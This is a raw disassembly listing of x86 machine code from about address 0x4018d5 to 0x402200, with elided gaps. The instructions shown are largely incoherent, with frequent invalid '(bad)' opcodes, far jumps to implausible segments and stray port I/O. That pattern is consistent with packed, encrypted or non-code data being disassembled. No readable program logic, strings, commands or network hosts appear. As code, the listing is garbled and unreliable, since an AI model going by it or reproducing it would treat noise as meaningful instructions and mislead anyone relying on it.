  4018d5:	mov    dl,BYTE PTR [edx-0x17]
  4018d8:	enter  0xa702,0xdb
  4018dc:	add    eax,DWORD PTR [eax]
  4018de:	mov    edi,fs
  4018e0:	pop    ebp
  4018e1:	add    DWORD PTR [eax+0x12feffd7],edx
  4018e7:	hlt    
  4018e8:	fist   DWORD PTR [ecx+0x0]
	...
  4018ff:	sub    DWORD PTR ds:0xe865c9f0,0x3
  401906:	push   ebp
  401907:	sbb    al,0x30
  401909:	test   ah,al
  40190b:	imul   ebp,DWORD PTR [esi-0x6e4c8a84],0x3
  401912:	(bad)  
  401913:	loop   0x40192c
  401915:	push   ebx
  401916:	(bad)  
  401917:	(bad)  
  401919:	pop    ecx
  40191a:	call   edx
  40191c:	repz (bad) [eax+0xb03dc5a]
  401923:	addr16 jo 0x40192f
  401926:	xor    DWORD PTR [edx-0x5f8afd21],0x2
  40192d:	adc    al,ah
  40192f:	cmp    DWORD PTR [ebx+0x79a700ab],0xf2a4f02c
  401939:	add    BYTE PTR [ecx-0x49],cl
  40193c:	ja     0x4018d8
  40193e:	lods   al,BYTE PTR ds:[esi]
  40193f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401940:	add    ch,cl
  401942:	add    ebx,DWORD PTR [ecx-0x45]
  401945:	stos   DWORD PTR es:[edi],eax
  401946:	add    BYTE PTR [edi+0x26e06257],ah
  40194c:	(bad)  
  40194d:	and    edi,ebp
  40194f:	loopne 0x40193e
  401951:	cmp    bl,BYTE PTR [ebx]
  401953:	cld    
  401954:	pop    eax
  401955:	jmp    0xeb98c0b3
  40195a:	pop    ecx
  40195b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40195c:	pop    eax
  40195d:	jmp    0xc3:0xe902a75b
	...
  401978:	mov    eax,0x69dbe577
  40197d:	xlat   BYTE PTR ds:[ebx]
  40197e:	jmp    0x65883786
  401983:	inc    esp
  401984:	sbb    edx,DWORD PTR [edx+0x5e]
  401987:	jns    0x401938
  401989:	ficomp DWORD PTR [edx]
  40198b:	out    dx,al
  40198c:	nop
  40198d:	in     eax,dx
  40198e:	es dec ecx
  401990:	pop    DWORD PTR [edx]
  401992:	jmp    0x94b9c09a
  401997:	sti    
  401998:	sub    eax,0x6f496410
  40199d:	push   edx
  40199e:	rol    DWORD PTR [ebx-0x7f16fd59],0x2a
  4019a5:	push   0x1e
  4019a7:	out    dx,eax
  4019a8:	pop    eax
  4019a9:	push   edx
  4019aa:	push   ss
  4019ab:	jns    0x40194c
  4019ad:	in     eax,dx
  4019ae:	mov    ebx,0x16f25ff
  4019b3:	add    al,0xba
  4019b5:	add    DWORD PTR [edx+0xed9fda],ebp
  4019bb:	jl     0x4019f9
  4019bd:	jg     0x401944
  4019bf:	jno    0x4019fa
  4019c1:	in     eax,dx
  4019c2:	(bad)  
  4019c3:	cmp    DWORD PTR [eax],edx
  4019c5:	ja     0x4019c3
  4019c7:	shl    DWORD PTR [ebx-0x13],1
  4019ca:	call   esi
  4019cc:	or     eax,0xedeb74ad
  4019d1:	scas   al,BYTE PTR es:[edi]
  4019d2:	(bad)  
  4019d3:	cmp    al,0xf7
  4019d5:	fyl2xp1 
  4019d7:	xchg   ebp,eax
  4019d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019d9:	add    cl,BYTE PTR [ebx+0xaa]
	...
  4019ef:	add    BYTE PTR [eax],al
  4019f1:	pop    ebp
  4019f2:	mov    ebx,0x57a4e1c2
  4019f7:	mov    edx,DWORD PTR [ebp-0x610739db]
  4019fd:	pop    edi
  4019fe:	(bad)  
  4019ff:	out    0x5b,eax
  401a01:	mov    ebp,0x5f60ffec
  401a06:	jmp    0xe900:0x1b72cc7
  401a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a0e:	in     eax,dx
  401a0f:	jne    0x4019f6
  401a11:	int3   
  401a12:	ret    0x6efd
  401a15:	mov    ecx,0x1df55578
  401a1a:	adc    DWORD PTR [edx-0x17],ebp
  401a1d:	inc    BYTE PTR [edx]
  401a1f:	(bad)  
  401a20:	fadd   QWORD PTR [eax+0x795175ec]
  401a26:	jbe    0x401a30
  401a28:	inc    esi
  401a29:	(bad)  
  401a2a:	(bad)  
  401a2b:	(bad)  
  401a2c:	fwait
  401a2d:	test   al,0xb9
  401a2f:	ret    0xa4e1
  401a32:	push   ebp
  401a33:	mov    edi,DWORD PTR ds:0x2ef8c725
  401a39:	out    dx,eax
  401a3a:	jmp    0xacc7:0x2a4e900
  401a41:	inc    eax
  401a42:	add    eax,DWORD PTR [eax]
  401a44:	jmp    0x9591ed
  401a49:	imul   edx,DWORD PTR ss:[edx],0x50d8038d
  401a50:	push   0x3f
  401a52:	fnsave [ebp-0x4]
	...
  401a69:	add    BYTE PTR [ecx],bh
  401a6b:	je     0x401a65
  401a6d:	inc    DWORD PTR [ebx+0x1252feee]
  401a73:	imul   eax,DWORD PTR [ebp-0x8],0x47
  401a77:	rol    DWORD PTR [eax+eax*1],0xd3
  401a7b:	imul   ebp,esp,0x456d0f6a
  401a81:	or     al,0x9e
  401a83:	fnsave [ebp+0x8]
  401a86:	out    0x1d,al
  401a88:	cld    
  401a89:	(bad)  
  401a8a:	cmp    DWORD PTR [eax+0x54ce08c2],ebp
  401a90:	mov    ebp,esp
  401a92:	mov    ah,0xfa
  401a94:	mov    WORD PTR [ebp-0x36],es
  401a97:	dec    edi
  401a98:	push   DWORD PTR [ebp-0x3a]
  401a9b:	(bad)  
  401a9c:	sub    bh,ah
  401a9e:	sub    esi,ebx
  401aa0:	leave  
  401aa1:	ret    0xffb6
  401aa4:	push   esp
  401aa5:	mov    ebp,DWORD PTR [edx]
  401aa7:	cmp    BYTE PTR [ebp+0xc],0xbe
  401aab:	jae    0x401ac1
  401aad:	or     DWORD PTR [ebx-0x778bfff1],0xffffffde
  401ab4:	jne    0x401ac6
  401ab6:	stc    
  401ab7:	jae    0x401ac5
  401ab9:	push   DWORD PTR [ebx-0x19]
  401abc:	out    0x9,eax
  401abe:	jmp    0x2:0xccc9ffdd
  401ac5:	push   ebp
  401ac6:	add    eax,0x4e75ffe3
  401acb:	fidiv  WORD PTR [ebp+0x8]
	...
  401ae2:	add    BYTE PTR [esi-0x4600004e],dh
  401ae8:	cmp    DWORD PTR [ebp+0x10],0x1477d9a7
  401aef:	and    al,0x7e
  401af1:	(bad)  
  401af2:	push   DWORD PTR [ebx+esi*8-0x13688a14]
  401af9:	jbe    0x401b07
  401afb:	xor    BYTE PTR [esi-0x5],ch
  401afe:	out    0xf0,eax
  401b00:	fucomi st,st(4)
  401b02:	(bad)  
  401b03:	out    dx,al
  401b04:	xchg   esi,eax
  401b05:	(bad)  
  401b06:	push   DWORD PTR [ebx+0x70]
  401b09:	fild   WORD PTR [ebx+0x7403e592]
  401b0f:	popf   
  401b10:	mov    esp,0xf10f0c76
  401b15:	xlat   BYTE PTR ds:[ebx]
  401b16:	add    BYTE PTR [edi-0x18d4fe30],ah
  401b1c:	or     ch,ch
  401b1e:	jne    0x401abb
  401b20:	pushf  
  401b21:	jbe    0x401b2b
  401b23:	iret   
  401b24:	inc    edi
  401b25:	in     al,dx
  401b26:	(bad)  
  401b27:	fdiv   DWORD PTR [ecx+0x2ea708c1]
  401b2d:	jns    0x401b1b
  401b2f:	and    al,0xfe
  401b31:	adc    edi,edi
  401b33:	cmp    dh,dh
  401b35:	in     al,dx
  401b36:	jne    0x401ae3
  401b38:	ins    BYTE PTR es:[edi],dx
  401b39:	jbe    0x401b43
  401b3b:	mov    edi,0xa8ffec9b
  401b40:	jg     0x401b3f
  401b42:	(bad)  
  401b43:	sbb    ch,ah
  401b45:	in     al,dx
  401b46:	jne    0x401b48
	...
  401b5c:	stos   DWORD PTR es:[edi],eax
  401b5d:	dec    eax
  401b5e:	jbe    0x401b68
  401b60:	jg     0x401bc7
  401b62:	in     al,dx
  401b63:	dec    DWORD PTR [eax-0x58f33edd]
  401b69:	xchg   BYTE PTR [eax-0x14],bh
  401b6c:	js     0x401b1d
  401b6e:	sti    
  401b6f:	out    0x70,eax
  401b71:	xor    ch,ah
  401b73:	call   edi
  401b75:	(bad)  
  401b78:	es add edx,ecx
  401b7b:	inc    edx
  401b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b7d:	jmp    0x3e891716
  401b82:	push   ss
  401b83:	in     al,dx
  401b84:	dec    eax
  401b85:	pop    ebp
  401b86:	jmp    0x113ad677
  401b8b:	pop    ds
  401b8c:	cmp    dl,ch
  401b8e:	(bad)  
  401b8f:	pop    eax
  401b90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b91:	ja     0x401b3f
  401b93:	(bad)  
  401b94:	fsubr  st,st(1)
  401b96:	je     0x401b93
  401b98:	or     BYTE PTR [esi],dh
  401b9a:	out    0xeb,al
  401b9c:	sbb    BYTE PTR [ebp-0x15],bl
  401b9f:	js     0x401c0b
  401ba1:	adc    bh,BYTE PTR [ecx]
  401ba3:	jmp    0x401b37
  401ba5:	cli    
  401ba6:	shl    BYTE PTR [ecx],0x0
  401ba9:	jmp    0x3ed:0xc4ee4cc6
  401bb0:	pop    edx
  401bb1:	jge    0x401b78
  401bb3:	xchg   ebx,esp
  401bb5:	out    0xae,al
  401bb7:	jno    0x401b68
  401bb9:	(bad)  
  401bbb:	in     eax,dx
  401bbc:	fsubr  st,st(1)
  401bbe:	rol    BYTE PTR [eax+0x0],cl
	...
  401bd5:	mov    ds:0x24e82c7b,eax
  401bda:	inc    eax
  401bdb:	(bad)  
  401bdd:	dec    esi
  401bde:	add    al,BYTE PTR [esi-0xb16548f]
  401be4:	sti    
  401be5:	enter  0x70d6,0xeb
  401be9:	test   al,0xe9
  401beb:	hlt    
  401bec:	out    0xa0,eax
  401bee:	outs   dx,DWORD PTR ds:[esi]
  401bef:	icebp  
  401bf0:	fstp   TBYTE PTR [eax+ebp*8+0x5e]
  401bf4:	jmp    0x401b86
  401bf6:	outs   dx,DWORD PTR ds:[esi]
  401bf7:	loope  0x401bd4
  401bf9:	mov    bl,0xe6
  401bfb:	dec    esi
  401bfc:	jmp    0x401c2a
  401bfe:	aas    
  401bff:	inc    ebp
  401c00:	mov    ebp,0x50e8fa65
  401c05:	sbb    al,0xd6
  401c07:	add    BYTE PTR [edx+0x67],ch
  401c0a:	out    dx,al
  401c0b:	(bad)  
  401c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c0d:	push   eax
  401c0e:	add    al,BYTE PTR [eax]
  401c10:	jmp    0x1d8593b9
  401c15:	sti    
  401c16:	jmp    0x4eacfd90
  401c1b:	aam    0xe9
  401c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c1e:	jg     0x401be0
  401c20:	sbb    DWORD PTR [edi+0x4cf175e9],0x3df6f9de
  401c2a:	jnp    0x401c71
  401c2c:	icebp  
  401c2d:	or     eax,0xafd1fc6f
  401c32:	aad    0x0
  401c34:	jmp    0xffb4c54a
	...
  401c4d:	add    ch,bh
  401c4f:	outs   dx,BYTE PTR ds:[esi]
  401c50:	clc    
  401c51:	cmp    DWORD PTR [ecx+0x2],esp
  401c54:	call   0x42c291
  401c59:	jo     0x401cc2
  401c5b:	out    dx,al
  401c5c:	(bad)  
  401c5d:	cmp    al,0xff
  401c5f:	(bad)  [ecx]
  401c61:	call   0xe0db:0x1cff02a4
  401c68:	mov    ebx,0x8be8bda2
  401c6d:	sub    al,0xd7
  401c6f:	clc    
  401c70:	(bad)  
  401c71:	xchg   esi,eax
  401c72:	aam    0x51
  401c74:	(bad)  
  401c75:	cld    
  401c76:	mov    esp,0xbd7f6ae0
  401c7b:	call   0xe8e8c849
  401c80:	push   esp
  401c81:	bound  edi,QWORD PTR [eax-0x7c]
  401c84:	les    ebx,FWORD PTR [ecx+0x65]
  401c87:	ds hlt 
  401c89:	jmp    0x64401f32
  401c8e:	out    0xe6,eax
  401c90:	push   eax
  401c91:	dec    esi
  401c92:	idiv   edx
  401c94:	out    0x0,eax
  401c96:	rcl    al,1
  401c98:	add    BYTE PTR [eax],al
  401c9a:	or     eax,esp
  401c9c:	js     0x401ceb
  401c9e:	mov    cl,0x72
  401ca0:	or     al,ch
  401ca2:	adc    bh,dl
  401ca4:	(bad)  
  401ca5:	call   edi
  401ca7:	inc    edx
  401ca8:	clc    
  401ca9:	xor    DWORD PTR [ebx],0xffffffdc
  401cac:	add    al,0x72
  401cae:	bound  eax,QWORD PTR [ecx+0xf86d]
	...
  401cc4:	add    BYTE PTR [eax],al
  401cc6:	add    BYTE PTR [edx-0x23],cl
  401cc9:	jne    0x401cc7
  401ccb:	xchg   esi,eax
  401ccc:	mov    dl,dl
  401cce:	add    BYTE PTR [esi],bh
  401cd0:	jmp    0xdd2c9194
  401cd5:	jne    0x401ccf
  401cd7:	ds inc esi
  401cd9:	add    al,ch
  401cdb:	psubsw mm7,mm7
  401cde:	inc    DWORD PTR [ecx]
  401ce0:	lods   al,BYTE PTR ds:[esi]
  401ce1:	not    eax
  401ce3:	xchg   DWORD PTR [edi],esp
  401ce5:	hlt    
  401ce6:	call   FWORD PTR [ebx-0x26]
  401ce9:	call   0x3f3983
  401cee:	jmp    0x27e6:0x875dad8
  401cf5:	sti    
  401cf6:	call   DWORD PTR [ecx]
  401cf8:	push   es
  401cf9:	ror    cl,0xc
  401cfc:	add    eax,DWORD PTR [eax]
  401cfe:	jmp    0x401cc8
  401d00:	push   es
  401d01:	ror    cl,0xfc
  401d04:	add    al,BYTE PTR [eax]
  401d06:	push   0xffffffcc
  401d08:	inc    ebp
  401d09:	cld    
  401d0a:	(bad)  
  401d0b:	mov    ebx,0x26f0e7eb
  401d10:	(bad)  
  401d12:	(bad)  
  401d13:	jnp    0x401d03
  401d15:	add    DWORD PTR [eax],eax
  401d17:	mov    es,WORD PTR [ebx]
  401d19:	lea    eax,[ebp-0x2]
  401d1c:	dec    esi
  401d1d:	push   DWORD PTR [ebp-0x6a]
  401d20:	retf   
  401d21:	sar    bl,cl
  401d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d24:	push   eax
  401d25:	jmp    0x48a1fad
  401d2a:	je     0x401d2c
	...
  401d40:	xchg   ebp,eax
  401d41:	lock mov ebx,0x6f2dea3b
  401d47:	pop    es
  401d48:	das    
  401d49:	fiadd  DWORD PTR [ebx]
  401d4b:	add    BYTE PTR [edi+0x672b0244],ah
  401d51:	adc    al,0x6
  401d53:	sub    esp,DWORD PTR [edi+0x32]
  401d56:	mov    BYTE PTR [edi+eiz*4],0xa6
  401d5a:	jl     0x401d48
  401d5c:	and    al,0x1d
  401d5e:	in     al,dx
  401d5f:	(bad)  
  401d60:	loop   0x401d5f
  401d62:	push   ebx
  401d63:	(bad)  
  401d64:	mov    edx,0x5448dbf1
  401d69:	fld    DWORD PTR [ebx]
  401d6b:	test   edi,esp
  401d6d:	jo     0x401d8b
  401d6f:	call   DWORD PTR [edx+0xfd8dbf1]
  401d75:	enter  0x89e8,0x62
  401d79:	shr    eax,1
  401d7b:	jne    0x401d80
  401d7d:	rcl    DWORD PTR [edx],0xd2
  401d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d81:	frndint 
  401d83:	mov    edi,0x75e8cd7b
  401d88:	fwait
  401d89:	mov    al,0x6e
  401d8b:	clc    
  401d8c:	ja     0x401d4f
  401d8e:	pop    ss
  401d8f:	or     esp,DWORD PTR [edi-0x2c8a1727]
  401d95:	nop
  401d96:	call   0xe919c56c
  401d9b:	jne    0x401d4c
  401d9d:	xor    DWORD PTR [edx-0x45804706],0xc2
	...
  401db7:	add    BYTE PTR [eax],al
  401db9:	lahf   
  401dba:	(bad)  [esi-0x75]
  401dbd:	mov    ebx,0xf4e8bf5b
  401dc2:	ror    ah,0x8d
  401dc5:	loop   0x401dc9
  401dc7:	gs push ebx
  401dc9:	nop
  401dca:	jo     0x401dbd
  401dcc:	fisttp DWORD PTR [edi+0x2a03e9d1]
  401dd2:	ret    
  401dd3:	fidivr WORD PTR [ebx+0x30]
  401dd6:	add    ebp,ecx
  401dd8:	add    esi,DWORD PTR [eax+0x70]
  401ddb:	icebp  
  401ddc:	(bad)  [ebx]
  401dde:	jmp    0x401e16
  401de0:	call   0xe8755e13
  401de5:	shl    dh,cl
  401de7:	adc    DWORD PTR [esi-0x316fc8a],esp
  401ded:	or     dh,dh
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	xchg   DWORD PTR [edi-0x1d8516fe],esp
  401df6:	repnz push es
  401df8:	outs   dx,BYTE PTR ds:[esi]
  401df9:	cmp    ebx,ebx
  401dfb:	sub    ebx,edx
  401dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dfe:	add    ch,BYTE PTR [edx-0x41]
  401e01:	stos   DWORD PTR es:[edi],eax
  401e02:	(bad)  
  401e03:	call   0x3942950b
  401e08:	fdivr  QWORD PTR [esi]
  401e0a:	add    ebp,ecx
  401e0c:	add    ebx,DWORD PTR [esi]
  401e0e:	inc    eax
  401e0f:	(bad)
  401e12:	out    dx,al
  401e13:	rcl    DWORD PTR [edi-0x7d16fcf2],0xeb
  401e1a:	(bad)  
  401e1b:	jecxz  0x401e20
	...
  401e31:	add    BYTE PTR [edi-0x30ac16ee],ah
  401e37:	xchg   edx,eax
  401e38:	jmp    0x2cbbc540
  401e3d:	fdivr  QWORD PTR ds:0xbb719e02
  401e43:	in     eax,0x1c
  401e45:	lock shr BYTE PTR [edi-0x7f],0xe7
  401e4a:	xor    dh,dl
  401e4c:	xchg   ecx,eax
  401e4d:	lea    edi,[esi-0x1c7d16fe]
  401e53:	push   cs
  401e54:	add    BYTE PTR [eax-0x1a],ah
  401e57:	jmp    0x3865:0xda80f4ff
  401e5e:	stos   DWORD PTR es:[edi],eax
  401e5f:	add    bh,bh
  401e61:	aam    0x8c
  401e63:	fst    QWORD PTR [eax+0x6ae58853]
  401e69:	loope  0x401e47
  401e6b:	popa   
  401e6c:	sub    BYTE PTR [eax-0xe8a1a5c],ch
  401e72:	dec    esp
  401e73:	(bad)  
  401e74:	cld    
  401e75:	ss dec eax
  401e77:	stc    
  401e78:	xlat   BYTE PTR ds:[ebx]
  401e79:	cs (bad) 
  401e7b:	out    dx,al
  401e7c:	call   FWORD PTR [esp+ecx*2+0x401dbadd]
  401e83:	in     eax,0x23
  401e85:	xor    DWORD PTR [eax+0x6f],ecx
  401e88:	clc    
  401e89:	push   cs
  401e8a:	mov    dh,0xda
  401e8c:	(bad)  
  401e8d:	jl     0x401ebb
  401e8f:	fucom  st(0)
  401e91:	std    
  401e92:	inc    ecx
  401e93:	in     eax,0x23
  401e95:	adc    DWORD PTR [eax],eax
	...
  401eab:	or     BYTE PTR [edi-0x14],ch
  401eae:	add    DWORD PTR [eax+0x9e90002],ebp
  401eb4:	outs   dx,DWORD PTR ds:[esi]
  401eb5:	call   0x25308b
  401eba:	jmp    0xc1488dc8
  401ebf:	shr    edx,cl
  401ec1:	inc    esi
  401ec3:	ins    DWORD PTR es:[edi],dx
  401ec4:	rcr    DWORD PTR [ebx-0x50],0xe6
  401ec8:	std    
  401ec9:	call   FWORD PTR [ebx]
  401ecb:	pop    esp
  401ecc:	(bad)  
  401ecd:	sub    DWORD PTR [ebx+ebx*8],0xffffffe4
  401ed1:	jae    0x401ec4
  401ed3:	leave  
  401ed4:	outs   dx,BYTE PTR ds:[esi]
  401ed5:	or     BYTE PTR [ecx-0x16ff2c59],dl
  401edb:	popf   
  401edc:	ret    0xabc9
  401edf:	mov    eax,0x350054e4
  401ee4:	int    0x8b
  401ee6:	inc    ebp
  401ee7:	mov    dh,0x1
  401ee9:	add    BYTE PTR [eax],0x8e
  401eec:	add    BYTE PTR [eax+0x6a],dl
  401eef:	into   
  401ef0:	(bad)  
  401ef1:	repnz sar BYTE PTR [esi+0x0],1
  401ef5:	leave  
  401ef6:	ret    0x82
  401ef9:	push   ebp
  401efa:	mov    ebp,edx
  401efc:	xor    al,0xfc
  401efe:	mov    ebp,DWORD PTR [ebx-0x18]
  401f01:	mov    cl,BYTE PTR [ebp+0x7a]
  401f04:	loope  0x401f14
  401f06:	push   ecx
  401f07:	mov    edi,0x8e2b02c6
  401f0c:	lock stos DWORD PTR es:[edi],eax
  401f0e:	pop    ecx
	...
  401f23:	add    ch,cl
  401f25:	fiadd  WORD PTR [ebx]
  401f27:	repz hlt 
  401f29:	cmp    al,0xc9
  401f2b:	ret    0x56
  401f2e:	push   ebp
  401f2f:	mov    ebp,DWORD PTR [edx+0x2b8b5735]
  401f35:	in     al,dx
  401f36:	sti    
  401f37:	mov    esi,DWORD PTR [ebx+0x4e4d8ae7]
  401f3d:	loope  0x401f41
  401f3f:	repz jb 0x401f7e
  401f42:	pop    esi
  401f43:	leave  
  401f44:	int3   
  401f45:	jmp    0x401f46
  401f47:	push   esp
  401f48:	xchg   ebp,eax
  401f49:	retf   0x5756
  401f4c:	xchg   ebp,eax
  401f4d:	push   ebx
  401f4e:	or     ah,bh
  401f50:	test   DWORD PTR [ebx],ebp
  401f52:	adc    BYTE PTR [ebx],ch
  401f54:	dec    esi
  401f55:	push   0x7d
  401f57:	or     al,0xdd
  401f59:	add    bl,dh
  401f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f5c:	cmc    
  401f5d:	test   al,0x75
  401f5f:	add    DWORD PTR [esi+0xcc95e3d],ecx
  401f65:	jmp    0x401f66
  401f67:	push   esp
  401f68:	push   ebp
  401f69:	retf   0xc483
  401f6c:	sub    dh,BYTE PTR ds:0x1a75357
  401f72:	add    al,BYTE PTR [ecx]
  401f74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f75:	ftst   
  401f77:	jne    0x401f18
  401f79:	xchg   ecx,eax
  401f7a:	xchg   ebx,eax
  401f7b:	jmp    FWORD PTR [eax-0x5082869c]
  401f81:	adc    al,0x3d
  401f83:	sub    esi,DWORD PTR [ebp+0x32]
  401f86:	add    al,0x1
	...
  401f9c:	add    BYTE PTR [edi-0x32eb8427],ah
  401fa2:	inc    ebx
  401fa3:	ret    0x7ee2
  401fa6:	pusha  
  401fa7:	addr16 or al,ah
  401faa:	pushf  
  401fab:	js     0x402022
  401fad:	mov    ds:0xa7fe3f13,eax
  401fb2:	adc    BYTE PTR [ebx+0x5f7c2b],bh
  401fb8:	cmp    ebp,DWORD PTR [edi]
  401fba:	sahf   
  401fbb:	in     al,0x0
  401fbd:	jmp    0x3ed9:0x96047a1b
  401fc4:	(bad)  
  401fc5:	mov    al,0x43
  401fc7:	dec    edi
  401fc8:	(bad)  
  401fc9:	sub    eax,0xab8829dd
  401fce:	sar    BYTE PTR [ecx+0x45],0x28
  401fd2:	jno    0x401fd4
  401fd4:	cmp    ah,BYTE PTR [esi-0x50]
  401fd7:	adc    BYTE PTR ss:[ebp+0x11c918d7],dl
  401fde:	cwde   
  401fdf:	outs   dx,BYTE PTR ds:[esi]
  401fe0:	aad    0x6c
  401fe2:	and    al,0x46
  401fe4:	leave  
  401fe5:	in     eax,0xdc
  401fe7:	add    edx,DWORD PTR [ebp+0x2c]
  401fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401feb:	add    ah,0xef
  401fee:	pop    es
  401fef:	dec    esi
  401ff0:	push   edi
  401ff1:	call   0x2d9b1c23
  401ff6:	fdivr  DWORD PTR [ebx+0x45]
  401ff9:	ficomp DWORD PTR [esi+0x40]
  401ffc:	add    DWORD PTR [edi],ebx
  401ffe:	add    ch,BYTE PTR [eax+ebp*8]
	...
  402015:	add    BYTE PTR [edi+eiz*8],bl
  402018:	es cmp eax,0xbce56d2c
  40201e:	(bad)  
  40201f:	jmp    0x3672:0x2a703e9
  402026:	xchg   edi,eax
  402027:	fild   QWORD PTR [ecx]
  402029:	out    0xea,al
  40202b:	(bad)  
  40202d:	lods   eax,DWORD PTR ds:[esi]
  40202e:	loop   0x40200f
  402030:	fisubr WORD PTR [ebp+0x4e711abb]
  402036:	mov    BYTE PTR [ebx],al
  402038:	mov    ah,0xe7
  40203a:	mov    al,0x98
  40203c:	lods   al,BYTE PTR ds:[esi]
  40203d:	out    0x2d,eax
  40203f:	not    DWORD PTR [eax]
  402041:	jl     0x40201d
  402043:	loopne 0x40203b
  402045:	lods   eax,DWORD PTR ds:[esi]
  402046:	loop   0x402027
  402048:	jno    0x402059
  40204a:	lahf   
  40204b:	adc    DWORD PTR [edi+0x3e],edi
  40204e:	pop    ebx
  40204f:	lea    edx,[esp+eiz*8+0x79e0f71f]
  402056:	repnz loope 0x402044
  402059:	dec    esi
  40205a:	inc    ecx
  40205b:	(bad)  
  40205c:	std    
  40205d:	sub    DWORD PTR [eax+ecx*2],ebp
  402060:	adc    DWORD PTR [ebx],esi
  402062:	fwait
  402063:	adc    al,BYTE PTR [esi]
  402065:	ds das 
  402067:	in     eax,0x29
  402069:	jns    0x4020d5
  40206b:	fbld   TBYTE PTR [ecx+0x0]
  40206e:	sub    eax,0x647aed48
  402073:	add    eax,DWORD PTR [esi+0x42]
  402076:	ins    BYTE PTR es:[edi],dx
  402077:	retf   
  402078:	stos   DWORD PTR es:[edi],eax
  402079:	adc    BYTE PTR [eax],al
	...
  40208f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402090:	aaa    
  402091:	(bad)  
  402092:	lock es (bad) 
  402095:	mov    ebp,0x1ae1f0e2
  40209a:	das    
  40209b:	int3   
  40209c:	(bad)  
  40209d:	and    al,0xe0
  40209f:	ja     0x402082
  4020a1:	add    BYTE PTR [ebx+ebp*4],bh
  4020a4:	jmp    0xa985:0x2ab99a3
  4020ab:	mov    ah,0x8a
  4020ad:	xchg   esi,eax
  4020ae:	jmp    0x1d3f2357
  4020b3:	stos   DWORD PTR es:[edi],eax
  4020b4:	jmp    0x2c89:0xe1c4972f
  4020bb:	iret   
  4020bc:	loope  0x402133
  4020be:	jge    0x402053
  4020c0:	push   0xffffffcf
  4020c2:	jmp    0xf6002e6b
  4020c7:	add    eax,0x8459458c
  4020cc:	push   edi
  4020cd:	hlt    
  4020ce:	push   ecx
  4020cf:	or     eax,0x2a56ffe1
  4020d4:	inc    edi
  4020d5:	clc    
  4020d6:	dec    esi
  4020d7:	into   
  4020d8:	(bad)  
  4020d9:	(bad)  
  4020da:	mov    esp,0x3975e14c
  4020df:	push   ebx
  4020e0:	mov    ?,esi
  4020e2:	ss inc esp
  4020e4:	loope  0x40215b
  4020e6:	sub    eax,0xe9cf4843
  4020eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020ec:	loope  0x402163
  4020ee:	in     eax,dx
  4020ef:	dec    esp
  4020f0:	adc    al,0xcf
  4020f2:	jmp    0x4020f7
	...
  402107:	add    BYTE PTR [edx+esi*1-0x705f6b01],ah
  40210e:	test   DWORD PTR [edi],edx
  402110:	inc    ebp
  402111:	loope  0x402112
  402113:	cdq    
  402114:	or     al,0xa7
  402116:	(bad)  
  402117:	test   BYTE PTR ds:0x5f575e1,0x57
  40211e:	clc    
  40211f:	je     0x402140
  402121:	lock (bad) 
  402123:	fiadd  WORD PTR ds:0x6d7e832
  402129:	loope  0x40212a
  40212b:	into   
  40212c:	dec    edi
  40212d:	or     ch,al
  40212f:	add    BYTE PTR [ecx+0x74ffffbe],bh
  402135:	push   cs
  402136:	push   0x47a66e
  40213b:	call   FWORD PTR [ebx+0x493e80e]
  402141:	in     al,0xff
  402143:	or     esp,esi
  402145:	jecxz  0x4021bc
  402147:	hlt    
  402148:	adc    DWORD PTR [edx],edi
  40214a:	clc    
  40214b:	call   FWORD PTR [ebx+0x2483e80e]
  402151:	in     al,0xff
  402153:	and    eax,DWORD PTR [esi-0x1b]
  402156:	jne    0x402150
  402158:	mov    eax,es:0xe501fffd
  40215e:	jne    0x402168
  402160:	test   BYTE PTR [edx-0x6f1e0009],0xc3
  402167:	pop    ebx
  402168:	mov    ebp,0x8
	...
  40217e:	add    BYTE PTR [eax],al
  402180:	add    BYTE PTR [ebx],bh
  402182:	xchg   ecx,eax
  402183:	in     al,dx
  402184:	cmp    DWORD PTR [edx+0xb8b57b7],0xffffffd8
  40218b:	or     al,al
  40218d:	sbb    cl,BYTE PTR [edx]
  40218f:	mov    DWORD PTR [eax],0x43e
  402195:	jne    0x40217c
  402197:	cmp    DWORD PTR [ebp-0x5a],0x5
  40219b:	jne    0x4021a4
  40219d:	aam    0x3
  40219f:	add    al,BYTE PTR [eax]
  4021a1:	ds icebp 
  4021a3:	jae    0x7541fdcc
  4021a9:	or     DWORD PTR [esi+0x0],edi
  4021ac:	add    DWORD PTR [esi],ecx
  4021ae:	add    al,0xeb
  4021b0:	add    ah,ch
  4021b2:	xchg   ebp,eax
  4021b3:	or     edx,0x206a7
  4021b9:	xchg   ebx,eax
  4021ba:	inc    edi
  4021bb:	cld    
  4021bc:	push   eax
  4021bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021be:	sbb    ebp,DWORD PTR [esi+0x0]
  4021c1:	lock ss adc bh,bh
  4021c5:	jb     0x402198
  4021c7:	jmp    0x402199
  4021c9:	lock jmp 0x1f272cd2
  4021cf:	jno    0x40215e
  4021d1:	push   0xffffff91
  4021d3:	xor    al,0x6a
  4021d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021d6:	push   esi
  4021d7:	inc    edi
  4021d8:	hlt    
  4021d9:	push   edi
  4021da:	repz add edi,edi
  4021dd:	xor    bl,cl
  4021df:	loopne 0x402256
  4021e1:	mov    bl,0x81
  4021e3:	popf   
  4021e4:	iret   
	...
  4021f9:	add    BYTE PTR [edi+0x1ac00ce9],ah
  4021ff:	test   DWORD PTR cs:[ebp-0x61],edi
